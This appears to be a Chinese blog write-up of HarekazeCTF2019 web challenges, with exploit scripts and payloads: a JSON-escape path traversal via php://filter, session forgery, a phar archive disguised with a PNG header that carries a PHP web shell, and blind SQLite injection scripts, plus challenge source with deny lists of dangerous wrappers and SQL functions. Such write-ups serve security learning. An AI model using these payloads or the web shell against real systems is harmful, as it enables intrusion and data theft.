

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;dark&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="osword">
  <meta name="keywords" content="">
  <title>HarekazeCTF2019 | WEB题解 - osword&#39;s blog</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/darcula.min.css" />
    
  

  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 4.2.1"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container page-header text-center fade-in-up">
            <span class="h2" id="subtitle">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2019-11-08 15:52" pubdate>
        2019年11月8日 下午
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      2.2k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      35
       分钟
    </span>
  

  
  
    
      <!-- 不蒜子统计文章PV -->
      <span id="busuanzi_container_page_pv" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="busuanzi_value_page_pv"></span> 次
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto" id="post">
            <!-- SEO header -->
            <h1 style="display: none">HarekazeCTF2019 | WEB题解</h1>
            
            <div class="markdown-body" id="post-body">
              <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>日常精准复现CTF</p>
<h1 id="encode-and-encode"><a href="#encode-and-encode" class="headerlink" title="encode_and_encode"></a>encode_and_encode</h1><p>考点：编码json转义unicode编码绕过</p>
<p>题解：<a href="https://ctftime.org/writeup/15459" target="_blank" rel="noopener">https://ctftime.org/writeup/15459</a></p>
<p><a href="https://xz.aliyun.com/t/6628" target="_blank" rel="noopener">https://xz.aliyun.com/t/6628</a></p>
<pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);

<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'source'</span>])) &#123;
  show_source(<span class="hljs-keyword">__FILE__</span>);
  <span class="hljs-keyword">exit</span>();
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span><span class="hljs-params">($str)</span> </span>&#123;
  $banword = [
    <span class="hljs-comment">// no path traversal</span>
    <span class="hljs-string">'\.\.'</span>,
    <span class="hljs-comment">// no stream wrapper</span>
    <span class="hljs-string">'(php|file|glob|data|tp|zip|zlib|phar):'</span>,
    <span class="hljs-comment">// no data exfiltration</span>
    <span class="hljs-string">'flag'</span>
  ];
  $regexp = <span class="hljs-string">'/'</span> . implode(<span class="hljs-string">'|'</span>, $banword) . <span class="hljs-string">'/i'</span>;
  <span class="hljs-keyword">if</span> (preg_match($regexp, $str)) &#123;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
  &#125;
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;
&#125;

$body = file_get_contents(<span class="hljs-string">'php://input'</span>);
$json = json_decode($body, <span class="hljs-keyword">true</span>);

<span class="hljs-keyword">if</span> (is_valid($body) &amp;&amp; <span class="hljs-keyword">isset</span>($json) &amp;&amp; <span class="hljs-keyword">isset</span>($json[<span class="hljs-string">'page'</span>])) &#123;
  $page = $json[<span class="hljs-string">'page'</span>];
  $content = file_get_contents($page);
  <span class="hljs-keyword">if</span> (!$content || !is_valid($content)) &#123;
    $content = <span class="hljs-string">"&lt;p&gt;not found&lt;/p&gt;\n"</span>;
  &#125;
&#125; <span class="hljs-keyword">else</span> &#123;
  $content = <span class="hljs-string">'&lt;p&gt;invalid request&lt;/p&gt;'</span>;
&#125;

<span class="hljs-comment">// no data exfiltration!!!</span>
$content = preg_replace(<span class="hljs-string">'/HarekazeCTF\&#123;.+\&#125;/i'</span>, <span class="hljs-string">'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;'</span>, $content);
<span class="hljs-keyword">echo</span> json_encode([<span class="hljs-string">'content'</span> =&gt; $content]);</code></pre>

<p>is_valid过滤危险字符，但是可以发现if语句中作用的is_valid是还未被json_decode解码。</p>
<p>利用json转义格式\u00(url编码字符)绕过</p>
<pre><code class="hljs livescript">. =&gt; <span class="hljs-string">\u002e</span>      F =&gt; <span class="hljs-string">\u0066</span></code></pre>

<p><img src="./1573041252425.png" srcset="/img/loading.gif" alt="1573041252425"></p>
<p>最终paylaod</p>
<pre><code class="hljs json">&#123;
    <span class="hljs-attr">"page"</span>: <span class="hljs-string">"php://filter/convert.base64-encode/resource=\u002e\u002e/\u002e\u002e/\u002e\u002e/\u002e\u002e/\u0066lag"</span>
&#125;</code></pre>



<h1 id="easy-notes"><a href="#easy-notes" class="headerlink" title="easy_notes"></a>easy_notes</h1><p>考点：session反序列化</p>
<p>export.php,会使用ZipArchive或PharData创建文件并写入note内容(可控)。再看生成的filename方法get_user()返回注册的用户名。且这里过了了<code>..</code>无法遍历目录。文件内容会通过回显示头带入</p>
<p><img src="./1573114337001.png" srcset="/img/loading.gif" alt="1573114337001"></p>
<p>$note值会将传入的$title、$body压入$_SESSION[‘notes’]数组</p>
<p><img src="./1573112891671.png" srcset="/img/loading.gif" alt="1573112891671"></p>
<p>flag.php,得到flag需要得到验证函数is_admin</p>
<p><img src="/media/osword/081D145C081D145C/%E5%A4%87%E4%BB%BD/Nutstore%20Files/Typora/ctf/HarekazeCTF2019.assets/1573114568489.png" srcset="/img/loading.gif" alt="1573114568489"></p>
<p>这里需要$_SESSION[‘admin’]==true是个布尔值</p>
<p><img src="./1573114654589.png" srcset="/img/loading.gif" alt="1573114654589"></p>
<p>考点明显是通过后端解析引擎差异对session进行反序列化。伪造session文件sess_axxxxxxx，写入<code>|N;admin|b:1;</code>，在以该文件名除去sess_作为cookie去访问flag文件触发反序列化，成功伪造admin身份，得到flag</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> re
<span class="hljs-keyword">import</span> requests
URL = <span class="hljs-string">'http://b745d7be-e0af-433d-9670-7c5b773aa47b.node3.buuoj.cn/'</span>

<span class="hljs-comment"># login as sess_</span>
sess = requests.Session()
sess.post(URL + <span class="hljs-string">'login.php'</span>, data=&#123;
    <span class="hljs-string">'user'</span>: <span class="hljs-string">'sess_aaaa'</span>
&#125;)

  <span class="hljs-comment"># make a crafted note</span>
sess.post(URL + <span class="hljs-string">'add.php'</span>, data=&#123;
    <span class="hljs-string">'title'</span>: <span class="hljs-string">'name|s:3:"456";admin|b:1;'</span>,
    <span class="hljs-string">'body'</span>: <span class="hljs-string">'hello'</span>
&#125;)

  <span class="hljs-comment"># make a fake session</span>
r = sess.get(URL + <span class="hljs-string">'export.php?type=.'</span>).headers[<span class="hljs-string">'Content-Disposition'</span>]
sessid = re.findall(<span class="hljs-string">r'sess_([0-9a-z-]+)'</span>, r)[<span class="hljs-number">0</span>]
  <span class="hljs-comment"># get the flag</span>
r = requests.get(URL + <span class="hljs-string">'?page=flag'</span>, cookies=&#123;
    <span class="hljs-string">'PHPSESSID'</span>: sessid
&#125;)
print(r.text)</code></pre>

<p><img src="./1573116094276.png" srcset="/img/loading.gif" alt="1573116094276"></p>
<h1 id="HarekazeCTF2019-Avatar-Uploader-1"><a href="#HarekazeCTF2019-Avatar-Uploader-1" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 1"></a>[HarekazeCTF2019]Avatar Uploader 1</h1><p>关键代码如下</p>
<p>分别使用finfo_file和getimagesize判断文件类型很是奇怪，考虑执行差异。</p>
<p><img src="./1573125060507.png" srcset="/img/loading.gif" alt="1573125060507"></p>
<p>传入如下文件</p>
<p>本地测试时候发现finfo可以读取到类型，但是getimagesize无法识别，利用此绕过<code>$size[2] !== IMAGETYPE_PNG</code></p>
<p><img src="./1573125130532.png" srcset="/img/loading.gif" alt="1573125130532"></p>
<p><img src="./1573125144393.png" srcset="/img/loading.gif" alt="1573125144393"></p>
<p>flag</p>
<p><img src="./1573125218861.png" srcset="/img/loading.gif" alt="1573125218861"></p>
<h1 id="HarekazeCTF2019-Avatar-Uploader-2"><a href="#HarekazeCTF2019-Avatar-Uploader-2" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 2"></a>[HarekazeCTF2019]Avatar Uploader 2</h1><p>考点：代码审计、phar反序列化、函数缺陷</p>
<p>hint:<a href="https://www.php.net/manual/ja/function.password-hash.php" target="_blank" rel="noopener">https://www.php.net/manual/ja/function.password-hash.php</a></p>
<p>upload.php：中FLAG1已经在upload1 利用结束</p>
<p>如下为session生成方法，构造方法中可以看出设置的cookie值是由明文data和加密后的data以<code>.</code>拼接</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SecureClientSession</span> </span>&#123;
  <span class="hljs-keyword">private</span> $cookieName;
  <span class="hljs-keyword">private</span> $secret;
  <span class="hljs-keyword">private</span> $data;

  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($cookieName = <span class="hljs-string">'session'</span>, $secret = <span class="hljs-string">'secret'</span>)</span> </span>&#123;
    <span class="hljs-keyword">$this</span>-&gt;data = [];
    <span class="hljs-keyword">$this</span>-&gt;secret = $secret;

    <span class="hljs-keyword">if</span> (array_key_exists($cookieName, $_COOKIE)) &#123;
      <span class="hljs-keyword">try</span> &#123;
        <span class="hljs-keyword">list</span>($data, $signature) = explode(<span class="hljs-string">'.'</span>, $_COOKIE[$cookieName]);
        $data = urlsafe_base64_decode($data);
        $signature = urlsafe_base64_decode($signature);
    
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;verify($data, $signature)) &#123;
          <span class="hljs-keyword">$this</span>-&gt;data = json_decode($data, <span class="hljs-keyword">true</span>);
        &#125;
      &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-keyword">Exception</span> $e) &#123;&#125;
    &#125;
  
    <span class="hljs-keyword">$this</span>-&gt;cookieName = $cookieName;
  &#125;

  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isset</span><span class="hljs-params">($key)</span> </span>&#123;
    <span class="hljs-keyword">return</span> array_key_exists($key, <span class="hljs-keyword">$this</span>-&gt;data);
  &#125;

  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span><span class="hljs-params">($key, $defaultValue = null)</span></span>&#123;
    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;isset($key)) &#123;
      <span class="hljs-keyword">return</span> $defaultValue;
    &#125;

    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;data[$key];
  &#125;

  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span><span class="hljs-params">($key, $value)</span></span>&#123;
    <span class="hljs-keyword">$this</span>-&gt;data[$key] = $value;
  &#125;

  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unset</span><span class="hljs-params">($key)</span> </span>&#123;
    <span class="hljs-keyword">unset</span>(<span class="hljs-keyword">$this</span>-&gt;data[$key]);
  &#125;

  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span><span class="hljs-params">()</span> </span>&#123;
    $json = json_encode(<span class="hljs-keyword">$this</span>-&gt;data);
    $value = urlsafe_base64_encode($json) . <span class="hljs-string">'.'</span> . urlsafe_base64_encode(<span class="hljs-keyword">$this</span>-&gt;sign($json));
    setcookie(<span class="hljs-keyword">$this</span>-&gt;cookieName, $value);
  &#125;

  <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">verify</span><span class="hljs-params">($string, $signature)</span> </span>&#123;
    <span class="hljs-keyword">return</span> password_verify(<span class="hljs-keyword">$this</span>-&gt;secret . $string, $signature);
  &#125;

  <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sign</span><span class="hljs-params">($string)</span> </span>&#123;
    <span class="hljs-keyword">return</span> password_hash(<span class="hljs-keyword">$this</span>-&gt;secret . $string, PASSWORD_BCRYPT);
  &#125;
&#125;</code></pre>



<p>再看sign方法中password_hash函数对第一个参数长度超过72会截断，也暗示着如果超出72字节的部分加密后的结果与72字节相同</p>
<p><img src="./1573129972732.png" srcset="/img/loading.gif" alt="1573129972732"></p>
<p>再看error方法，$message赋值到$session设置中，输出之后的data值是超过72字节</p>
<p><img src="./1573130886081.png" srcset="/img/loading.gif" alt="1573130886081"></p>
<p><img src="./1573130861491.png" srcset="/img/loading.gif" alt="1573130861491"></p>
<p>一处可以利用的点，include可以触发phar包写一句话木马</p>
<p>可以向theme键value值替换为需要包含的文件路径,在加上error方法导致的长度大于72，可以控制data部分值，并且绕过签名验证。</p>
<p><img src="./1573129102382.png" srcset="/img/loading.gif" alt="1573129102382"></p>
<p><img src="./1573129084102.png" srcset="/img/loading.gif" alt="1573129084102"></p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>phar包构造,需要构造$png_header绕过upload.php两个图片验证，写入exp.css文件带有一句话木马</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52</span>
$png_header = hex2bin(<span class="hljs-string">'89504e470d0a1a0a0000000d49484452000000400000004000'</span>);
$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">'exp.phar'</span>);
$phar-&gt;startBuffering();
$phar-&gt;addFromString(<span class="hljs-string">'exp.css'</span>, <span class="hljs-string">'&lt;?php system($_GET["cmd"]); ?&gt;'</span>);
$phar-&gt;setStub($png_header . <span class="hljs-string">'&lt;?php __HALT_COMPILER(); ?&gt;'</span>);
$phar-&gt;stopBuffering();</code></pre>

<p><img src="./1573189902248.png" srcset="/img/loading.gif" alt="1573189902248"></p>
<p>上传该phar包</p>
<p><img src="./1573189920227.png" srcset="/img/loading.gif" alt="1573189920227"></p>
<p>赋值新生成的session，进行进一步伪造，增加theme键</p>
<p><img src="./1573190007834.png" srcset="/img/loading.gif" alt="1573190007834"></p>
<p>替换原来的data值,index.php包含之，就能够执行命令</p>
<p><img src="./1573190100617.png" srcset="/img/loading.gif" alt="1573190100617"></p>
<p><img src="./1573189601089.png" srcset="/img/loading.gif" alt="1573189601089"></p>
<p><strong>flag</strong></p>
<p><img src="./1573189633670.png" srcset="/img/loading.gif" alt="1573189633670"></p>
<h1 id="Sqlite-Voting"><a href="#Sqlite-Voting" class="headerlink" title="Sqlite Voting"></a>Sqlite Voting</h1><p>考点：逻辑报错、sql注入、sqlite、过滤绕过</p>
<p>sqlite函数列表：<a href="https://www.sqlite.org/lang_corefunc.html" target="_blank" rel="noopener">https://www.sqlite.org/lang_corefunc.html</a></p>
<p><img src="./1573196682665.png" srcset="/img/loading.gif" alt="1573196682665"></p>
<p>vote.php</p>
<pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);

<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'source'</span>])) &#123;
  show_source(<span class="hljs-keyword">__FILE__</span>);
  <span class="hljs-keyword">exit</span>();
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span><span class="hljs-params">($str)</span> </span>&#123;
  $banword = [
    <span class="hljs-comment">// dangerous chars</span>
    <span class="hljs-comment">// " % ' * + / &lt; = &gt; \ _ ` ~ -</span>
    <span class="hljs-string">"[\"%'*+\\/&lt;=&gt;\\\\_`~-]"</span>,
    <span class="hljs-comment">// whitespace chars</span>
    <span class="hljs-string">'\s'</span>,
    <span class="hljs-comment">// dangerous functions</span>
    <span class="hljs-string">'blob'</span>, <span class="hljs-string">'load_extension'</span>, <span class="hljs-string">'char'</span>, <span class="hljs-string">'unicode'</span>,
    <span class="hljs-string">'(in|sub)str'</span>, <span class="hljs-string">'[lr]trim'</span>, <span class="hljs-string">'like'</span>, <span class="hljs-string">'glob'</span>, <span class="hljs-string">'match'</span>, <span class="hljs-string">'regexp'</span>,
    <span class="hljs-string">'in'</span>, <span class="hljs-string">'limit'</span>, <span class="hljs-string">'order'</span>, <span class="hljs-string">'union'</span>, <span class="hljs-string">'join'</span>
  ];
  $regexp = <span class="hljs-string">'/'</span> . implode(<span class="hljs-string">'|'</span>, $banword) . <span class="hljs-string">'/i'</span>;
  <span class="hljs-keyword">if</span> (preg_match($regexp, $str)) &#123;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
  &#125;
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;
&#125;

header(<span class="hljs-string">"Content-Type: text/json; charset=utf-8"</span>);

<span class="hljs-comment">// check user input</span>
<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'id'</span>]) || <span class="hljs-keyword">empty</span>($_POST[<span class="hljs-string">'id'</span>])) &#123;
  <span class="hljs-keyword">die</span>(json_encode([<span class="hljs-string">'error'</span> =&gt; <span class="hljs-string">'You must specify vote id'</span>]));
&#125;
$id = $_POST[<span class="hljs-string">'id'</span>];
<span class="hljs-keyword">if</span> (!is_valid($id)) &#123;
  <span class="hljs-keyword">die</span>(json_encode([<span class="hljs-string">'error'</span> =&gt; <span class="hljs-string">'Vote id contains dangerous chars'</span>]));
&#125;

<span class="hljs-comment">// update database</span>
$pdo = <span class="hljs-keyword">new</span> PDO(<span class="hljs-string">'sqlite:../db/vote.db'</span>);
$res = $pdo-&gt;query(<span class="hljs-string">"UPDATE vote SET count = count + 1 WHERE id = $&#123;id&#125;"</span>);
<span class="hljs-keyword">if</span> ($res === <span class="hljs-keyword">false</span>) &#123;
  <span class="hljs-keyword">die</span>(json_encode([<span class="hljs-string">'error'</span> =&gt; <span class="hljs-string">'An error occurred while updating database'</span>]));
&#125;

<span class="hljs-comment">// succeeded!</span>
<span class="hljs-keyword">echo</span> json_encode([
  <span class="hljs-string">'message'</span> =&gt; <span class="hljs-string">'Thank you for your vote! The result will be published after the CTF finished.'</span>
]);</code></pre>



<p>根据源码，创建模拟数据方便测试</p>
<pre><code class="hljs sql"><span class="hljs-comment"># 安装:sudo apt install sqlite3</span>

<span class="hljs-comment"># 模拟数据创建</span>
sqlite&gt; DROP TABLE IF EXISTS `vote`;
sqlite&gt; CREATE TABLE `vote` (
   ...&gt;   `id` INTEGER PRIMARY KEY AUTOINCREMENT,
   ...&gt;   `name` TEXT NOT NULL,
   ...&gt;   `count` INTEGER
   ...&gt; );
sqlite&gt; INSERT INTO `vote` (`name`, `count`) VALUES
   ...&gt;   ('dog', 0),
   ...&gt;   ('cat', 0),
   ...&gt;   ('zebra', 0),
   ...&gt;   ('koala', 0);
sqlite&gt; create table flag (flag text);
sqlite&gt; insert into flag values ('HarekazeCTF&#123;test&#125;');</code></pre>

<p>解题思路是利用sqlite逻辑报错进行盲注,abs函数存在整型溢出</p>
<p>利用ifnull,nullif注入flag长度</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests

url = <span class="hljs-string">"http://236fd178-f35e-4f3e-88e0-70374086e68c.node3.buuoj.cn/vote.php"</span>

<span class="hljs-comment"># get flag length</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):
    data = &#123;
        <span class="hljs-string">'id'</span>:<span class="hljs-string">f'abs(ifnull(nullif(length((SELECT(flag)from(flag))),<span class="hljs-subst">&#123;i&#125;</span>),0x8000000000000000))'</span>
    &#125;
    rep = requests.post(url,data=data)
    print(data)
    <span class="hljs-keyword">if</span> <span class="hljs-string">'An error occurred'</span> <span class="hljs-keyword">in</span> rep.text:
        print(<span class="hljs-string">'length: '</span>+str(i))
        <span class="hljs-keyword">break</span></code></pre>

<p><img src="./1573196707908.png" srcset="/img/loading.gif" alt="1573196707908"></p>
<p>在平常做盲注都需要字符截取进行逐位判断，但这里过滤了字符截取函数，可以使用||连接字符</p>
<p><img src="./1573198578923.png" srcset="/img/loading.gif" alt="1573198578923"></p>
<p>考虑使用replace+length替换substr，逻辑如下,需要知道flag前几个字符,在逐位猜解</p>
<p><img src="./1573198633285.png" srcset="/img/loading.gif" alt="1573198633285"></p>
<p>但是单引号双引号被过滤，还有能替换的只有hex函数，但是字符拼接0-9无需单引号，但是字符A-Z需要单双引号，可以去数据库中取</p>
<pre><code class="hljs python">table = &#123;&#125;
table[<span class="hljs-string">'A'</span>] = <span class="hljs-string">'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'</span> <span class="hljs-comment"># 'zebra' → '7A65627261'</span>
table[<span class="hljs-string">'C'</span>] = <span class="hljs-string">'trim(hex(typeof(.1)),12567)'</span> <span class="hljs-comment"># 'real' → '7265616C'</span>
table[<span class="hljs-string">'D'</span>] = <span class="hljs-string">'trim(hex(0xffffffffffffffff),123)'</span> <span class="hljs-comment"># 0xffffffffffffffff = -1 → '2D31'</span>
table[<span class="hljs-string">'E'</span>] = <span class="hljs-string">'trim(hex(0.1),1230)'</span> <span class="hljs-comment"># 0.1 → 302E31</span>
table[<span class="hljs-string">'F'</span>] = <span class="hljs-string">'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'</span> <span class="hljs-comment"># 'dog' → '646F67'</span>
table[<span class="hljs-string">'B'</span>] = <span class="hljs-string">f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||<span class="hljs-subst">&#123;table[<span class="hljs-string">"C"</span>]&#125;</span>||<span class="hljs-subst">&#123;table[<span class="hljs-string">"F"</span>]&#125;</span>)'</span> <span class="hljs-comment"># 'koala' → '6B6F616C61'</span></code></pre>

<h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>参考连接：<a href="https://st98.github.io/diary/posts/2019-05-21-harekaze-ctf-2019.html#web-350-sqlite-voting" target="_blank" rel="noopener">https://st98.github.io/diary/posts/2019-05-21-harekaze-ctf-2019.html#web-350-sqlite-voting</a></p>
<pre><code class="hljs python"><span class="hljs-comment"># coding: utf-8</span>
<span class="hljs-keyword">import</span> binascii
<span class="hljs-keyword">import</span> requests
URL = <span class="hljs-string">'http://236fd178-f35e-4f3e-88e0-70374086e68c.node3.buuoj.cn/vote.php'</span>

<span class="hljs-comment"># フラグの長さを特定</span>
l = <span class="hljs-number">0</span>
i = <span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">16</span>):
  r = requests.post(URL, data=&#123;
    <span class="hljs-string">'id'</span>: <span class="hljs-string">f'abs(case(length(hex((select(flag)from(flag))))&amp;<span class="hljs-subst">&#123;<span class="hljs-number">1</span>&lt;&lt;j&#125;</span>)when(0)then(0)else(0x8000000000000000)end)'</span>
  &#125;)
  <span class="hljs-keyword">if</span> <span class="hljs-string">b'An error occurred'</span> <span class="hljs-keyword">in</span> r.content:
    l |= <span class="hljs-number">1</span> &lt;&lt; j
print(<span class="hljs-string">'[+] length:'</span>, l)

<span class="hljs-comment"># A-F のテーブルを作成</span>
table = &#123;&#125;
table[<span class="hljs-string">'A'</span>] = <span class="hljs-string">'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'</span>
table[<span class="hljs-string">'C'</span>] = <span class="hljs-string">'trim(hex(typeof(.1)),12567)'</span>
table[<span class="hljs-string">'D'</span>] = <span class="hljs-string">'trim(hex(0xffffffffffffffff),123)'</span>
table[<span class="hljs-string">'E'</span>] = <span class="hljs-string">'trim(hex(0.1),1230)'</span>
table[<span class="hljs-string">'F'</span>] = <span class="hljs-string">'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'</span>
table[<span class="hljs-string">'B'</span>] = <span class="hljs-string">f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||<span class="hljs-subst">&#123;table[<span class="hljs-string">"C"</span>]&#125;</span>||<span class="hljs-subst">&#123;table[<span class="hljs-string">"F"</span>]&#125;</span>)'</span>

<span class="hljs-comment"># フラグをゲット!</span>
res = binascii.hexlify(<span class="hljs-string">b'flag&#123;'</span>).decode().upper()
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(res), l):
  <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-string">'0123456789ABCDEF'</span>:
    t = <span class="hljs-string">'||'</span>.join(c <span class="hljs-keyword">if</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">'0123456789'</span> <span class="hljs-keyword">else</span> table[c] <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> res + x)
    print(t)
    r = requests.post(URL, data=&#123;
      <span class="hljs-string">'id'</span>: <span class="hljs-string">f'abs(case(replace(length(replace(hex((select(flag)from(flag))),<span class="hljs-subst">&#123;t&#125;</span>,trim(0,0))),<span class="hljs-subst">&#123;l&#125;</span>,trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)'</span>
    &#125;)
    <span class="hljs-keyword">if</span> <span class="hljs-string">b'An error occurred'</span> <span class="hljs-keyword">in</span> r.content:
      res += x
      <span class="hljs-keyword">break</span>
  print(<span class="hljs-string">f'[+] flag (<span class="hljs-subst">&#123;i&#125;</span>/<span class="hljs-subst">&#123;l&#125;</span>): <span class="hljs-subst">&#123;res&#125;</span>'</span>)
  i += <span class="hljs-number">1</span>
print(<span class="hljs-string">'[+] flag:'</span>, binascii.unhexlify(res).decode())</code></pre>

<p>还有一个解是利用max函数</p>
<pre><code class="hljs sqf">假设前几位为<span class="hljs-built_in">flag</span>&#123; =&gt; hex(<span class="hljs-string">'flag&#123;&#125;'</span>) =&gt;<span class="hljs-number">666</span>C61677B =&gt; 之后在拼接上<span class="hljs-number">0</span>*剩余<span class="hljs-built_in">flag</span>长度=&gt;在用<span class="hljs-built_in">max</span>函数逐位去比较
逻辑如下
